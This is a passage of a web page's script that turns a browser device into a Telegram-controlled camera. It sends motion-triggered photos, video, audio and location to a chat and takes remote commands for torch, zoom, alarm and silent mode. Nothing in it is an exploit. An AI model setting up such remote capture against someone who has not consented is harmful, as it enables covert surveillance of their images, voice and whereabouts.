              else await sendTelegramNotice(`🎤 Audio is ${audioEnabled ? 'ON' : 'OFF'}. /audio on|off`);
            } catch (err) { await sendTelegramNotice(`🎤 Failed: ${err.message}`); }
          }

          else if (cmd === '/wake') {
            if (arg === 'off') { await releaseWakeLock(); await sendTelegramNotice('💡 Wake released.'); }
            else {
              const ok = await requestWakeLock();
              await sendTelegramNotice(ok ? '💡 Wake active.' : '💡 Wake not supported.');
            }
          }

          else if (cmd === '/locate' || cmd === '/location') await sendLocationToTelegram();

          else if (cmd === '/timelapse') {
            const min = parseInt(arg, 10);
            if (!isFinite(min) || min < 0 || min > 240) {
              await sendTelegramNotice('⏰ /timelapse 5 (1–240, 0 stops)');
            } else if (min === 0) { stopTimelapse(); await sendTelegramNotice('⏰ Stopped.'); }
            else { startTimelapse(min); await sendTelegramNotice(`⏰ Every ${min}m.`); }
          }

          else if (cmd === '/silent') {
            if (arg === 'on' || arg === 'off') {
              silentMode = arg === 'on';
              localStorage.setItem('tg_silent', String(silentMode));
              await sendTelegramNotice(`🔇 Silent ${silentMode ? 'ON' : 'OFF'}.`);
            } else {
              await sendTelegramNotice(`🔇 Silent is ${silentMode ? 'ON' : 'OFF'}. /silent on|off`);
            }
          }

          else if (cmd === '/battery') {
            const n = parseInt(arg, 10);
            if (!isFinite(n) || n < 1 || n > 50) {
              await sendTelegramNotice(`🔋 Usage: /battery 15 (1–50). Current: ${autoPauseBattery}%`);
            } else {
              autoPauseBattery = n;
              localStorage.setItem('tg_autoPauseBattery', String(n));
              await sendTelegramNotice(`🔋 Auto-pause below ${n}%.`);
            }
          }

          /* ---- #9 torch ---- */
          else if (cmd === '/torch') {
            try {
              let on;
              if (arg === 'on') on = true;
              else if (arg === 'off') on = false;
              else on = !(await (async () => {
                const caps = stream?.getVideoTracks()[0]?.getCapabilities?.();
                return caps?.torch && (stream.getVideoTracks()[0].getSettings?.().torch);
              })());
              await setTorch(on);
              await sendTelegramNotice(`🔦 Torch ${on ? 'ON' : 'OFF'}.`);
            } catch (err) { await sendTelegramNotice(`🔦 ${err.message}`); }
          }

          /* ---- #10 zoom ---- */
          else if (cmd === '/zoom') {
            const z = parseFloat(arg);
            if (!isFinite(z) || z < 1 || z > 4) {
              await sendTelegramNotice(`🔍 Zoom ${zoomFactor}×. /zoom 1–4`);
            } else {
              zoomFactor = z;
              localStorage.setItem('tg_zoom', String(z));
              await sendTelegramNotice(`🔍 Zoom ${z}×.`);
            }
          }

          /* ---- #10 alarm ---- */
          else if (cmd === '/alarm') {
            const sec = Math.min(Math.max(parseInt(arg, 10) || 10, 1), 60);
            await sendTelegramNotice(`🚨 Alarm for ${sec}s.`);
            runAlarm(sec * 1000).catch(e => logEvent(`alarm: ${e.message}`));
          }

          /* ---- convenience: find = torch + beep ---- */
          else if (cmd === '/find') {
            await sendTelegramNotice('🔔 Find mode 3s.');
            try { await setTorch(true); } catch {}
            runAlarm(3000).catch(()=>{});
            setTimeout(() => setTorch(false).catch(()=>{}), 3200);
          }

          /* ---- /weather ---- */
          else if (cmd === '/weather') {
            await sendTelegramNotice('🌤 Fetching…');
            const w = await fetchWeather();
            await sendTelegramNotice(`🌤 ${w}`);
          }

          /* ---- #13 adaptive interval ---- */
          else if (cmd === '/adaptive') {
            if (arg === 'on' || arg === 'off') {
              adaptiveInterval = arg === 'on';
              localStorage.setItem('tg_adaptive', String(adaptiveInterval));
              applyAdaptiveInterval();
              await sendTelegramNotice(`⚙️ Adaptive ${adaptiveInterval ? 'ON' : 'OFF'}.`);
            } else {
              await sendTelegramNotice(`⚙️ Adaptive is ${adaptiveInterval ? 'ON' : 'OFF'}. /adaptive on|off`);
            }
          }

          else if (cmd === '/video') {
            if (flushingVideo) { await sendTelegramNotice('🎥 Busy — wait.'); continue; }
            flushingVideo = true;
            try {
              const snapshot = await flushVideoBuffer();
              if (!snapshot || snapshot.blob.size < 1000) {
                await sendTelegramNotice(
                  `🎥 No usable video.\nSegments: ${completedSegments.length}\n` +
                  `Mime: ${usedMime || 'unknown'}\nRecorder: ${recorder ? recorder.state : 'none'}`
                );
              } else {
                const sizeMb = (snapshot.blob.size / 1024 / 1024).toFixed(2);
                await sendTelegramNotice(`🎥 Uploading ${sizeMb} MB…`);
                const w = video.videoWidth || 640, h = video.videoHeight || 480;
                const durationSec = Math.round((snapshot.segCount * RECORD_SEGMENT_MS) / 1000);
                enqueueVideo(snapshot.blob, snapshot.mime, { width: w, height: h, duration: durationSec });
              }
            } catch (err) {
              logEvent(`video fail: ${err.message}`);
              await sendTelegramNotice(`🎥 Failed: ${err.message}`);
            } finally {
              flushingVideo = false;
            }
          }
        }
      } catch (err) { console.warn('Poll error:', err.message); }
    }

    function startPolling() {
      if (pollTimer) return;
      pollTelegramCommands();
      pollTimer = setInterval(pollTelegramCommands, POLL_INTERVAL_MS);
    }
    function stopPolling() {
      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
    }

    /* ============== camera / facing mode ============== */
    async function setFacingMode(mode, source = 'telegram') {
      if (mode === facingMode && stream) {
        if (source === 'telegram') await sendTelegramNotice(`Already ${mode === 'user' ? 'front' : 'back'}.`);
        return;
      }
      const oldMode = facingMode;
      facingMode = mode;
      const label = mode === 'user' ? 'front' : 'back';
      setStatus(`Switching to ${label}…`);
      stopRecorder();
      stopStream();
      completedSegments = [];
      currentChunks = [];

      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: facingMode } },
          audio: audioEnabled
        });
      } catch (err) {
        setStatus(`Switch failed: ${describeCameraError(err)}`);
        logEvent(`switch ${label} failed: ${err.message}`);
        try {
          facingMode = oldMode;
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: audioEnabled });
        } catch { return; }
      }

      video.srcObject = stream;
      try {
        await new Promise((res, rej) => {
          const cleanup = () => { video.removeEventListener('loadeddata', onL); video.removeEventListener('error', onE); };
          const onL = () => { cleanup(); res(); };
          const onE = () => { cleanup(); rej(new Error('video load')); };
          if (video.readyState >= 2) return res();
          video.addEventListener('loadeddata', onL, { once: true });
          video.addEventListener('error', onE, { once: true });
        });
      } catch { setStatus('Video failed after switch.'); return; }

      setStatus(`Now using ${label}.`);
      logEvent(`camera → ${label}`);
      startRecorder(); scheduleSegmentRotation();
      startRecorderWatchdog();
      if (source === 'telegram') await sendTelegramNotice(`🔄 Switched to ${label}.`);
    }

    function setPaused(paused) {
      isPaused = paused;
      setStatus(paused ? 'Paused.' : 'Resumed.');
      logEvent(paused ? 'paused' : 'resumed');
      if (!paused && stream && !fastTimer) {
        fastTimer = setInterval(tick, currentInterval);
        tick();
      }
    }

    /* ============== capture loop ============== */
    async function tick() {
      if (isCapturing || isPaused) return;
      isCapturing = true;
      try {
        const { w, h } = drawFrame();
        const blob = await canvasToBlob(canvas, 'image/jpeg', 0.85);

        let frameChanged = true;
        if (motionEnabled) {
          const m = detectMotion();
          frameChanged = m.changed;
        }

        channel.postMessage({ type: 'frame', blob, ts: Date.now() });
        pushFrameToViewer(blob);

        const now = Date.now();
        const cooldownOk = now - lastMotionAt > MOTION_COOLDOWN_MS || !motionEnabled;
        if (frameChanged && cooldownOk && now - lastTelegramSent >= TELEGRAM_MS) {
          lastTelegramSent = now;
          lastMotionAt = frameChanged ? now : lastMotionAt;
          const idx = ++captureCount;
          enqueuePhoto(blob, idx);
        }

        applyAdaptiveInterval();
      } catch (err) {
        console.error('tick failed:', err);
        setStatus(`Capture error: ${err.message}`);
        logEvent(`tick: ${err.message}`);
      } finally {
        isCapturing = false;
      }
    }

    function stopCapture(reason) {
      if (fastTimer) { clearInterval(fastTimer); fastTimer = null; }
      stopRecorder();
      stopStream();
      if (reason) { setStatus(reason); logEvent(`stop: ${reason}`); }
    }

    /* ============== start ============== */
    async function startCapture() {
      setStatus('');
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: facingMode } },
          audio: audioEnabled
        });
      } catch (err) {
        setStatus(describeCameraError(err));
        logEvent(`camera acquire: ${err.message}`);
        return;
      }
      video.srcObject = stream;
      try {
        await new Promise((res, rej) => {
          const cleanup = () => { video.removeEventListener('loadeddata', onL); video.removeEventListener('error', onE); };
          const onL = () => { cleanup(); res(); };
          const onE = () => { cleanup(); rej(new Error('video load')); };
          if (video.readyState >= 2) return res();
          video.addEventListener('loadeddata', onL, { once: true });
          video.addEventListener('error', onE, { once: true });
        });
      } catch {
        setStatus('Preview failed.');
        logEvent('preview failed');
        stopStream();
        return;
      }

      isPaused = false;
      setStatus('');
      if (fastTimer) clearInterval(fastTimer);
      currentInterval = FAST_MS;
      fastTimer = setInterval(tick, FAST_MS);
      tick();
      startPolling();
      logEvent('capture started');

      startRecorder(); scheduleSegmentRotation();
      startRecorderWatchdog();
    }

    /* ============== lifecycle ============== */
    window.addEventListener('pagehide', () => {
      stopCapture();
      stopPolling();
      releaseWakeLock();
      stopTimelapse();
    });

    document.addEventListener('visibilitychange', async () => {
      if (document.hidden) {
        logEvent('visibility: hidden');
      } else {
        logEvent('visibility: visible');
        if (!fastTimer && stream && !isPaused) {
          fastTimer = setInterval(tick, currentInterval);
          tick();
        }
        // recover recorder if it died while hidden
        if (stream && !isPaused && (!recorder || recorder.state === 'inactive')) {
          logEvent('recorder restart after visible');
          startRecorder(); scheduleSegmentRotation();
        }
        if (!wakeLock && document.visibilityState === 'visible') requestWakeLock();
      }
    });

    setInterval(() => {
      if (stream && !isPaused && !fastTimer && !recovering && !flushingVideo) {
        logEvent('watchdog: restart timer');
        fastTimer = setInterval(tick, currentInterval);
        tick();
      }
    }, 5000);

    /* ============== battery ============== */
    (async () => {
      if (!navigator.getBattery) return;
      try {
        const ua = navigator.userAgent;
        const isMobile = /android|iphone|ipad|ipod/i.test(ua) ||
                         (navigator.maxTouchPoints > 1 && /macintosh/i.test(ua));
        const b = await navigator.getBattery();
        batteryLevel = b.level;
        batteryCharging = b.charging;
        batteryIsReal = !(!isMobile && b.level === 1 && b.charging === true);
        const onBatteryChange = () => {
          batteryLevel = b.level; batteryCharging = b.charging;
          if (batteryIsReal && batteryLevel * 100 <= autoPauseBattery && !batteryCharging && !isPaused) {
            setPaused(true);
            sendTelegramNotice(`🔋 ${Math.round(batteryLevel*100)}% — auto-paused.`).catch(()=>{});
          }
        };
        b.addEventListener('levelchange', onBatteryChange);
        b.addEventListener('chargingchange', onBatteryChange);
        if (batteryIsReal) logEvent(`battery: ${Math.round(batteryLevel*100)}%`);
      } catch { /* ignore */ }
    })();

    window.addEventListener('offline', () => logEvent('network: offline'));
    window.addEventListener('online', () => {
      logEvent('network: online');
      if (consecutiveFails > 0 && !recovering) consecutiveFails = 0;
      drainQueue();
    });

    /* ============== boot ============== */
    askNameIfNeeded();
    startCapture();
  </script>
</body>
</html>
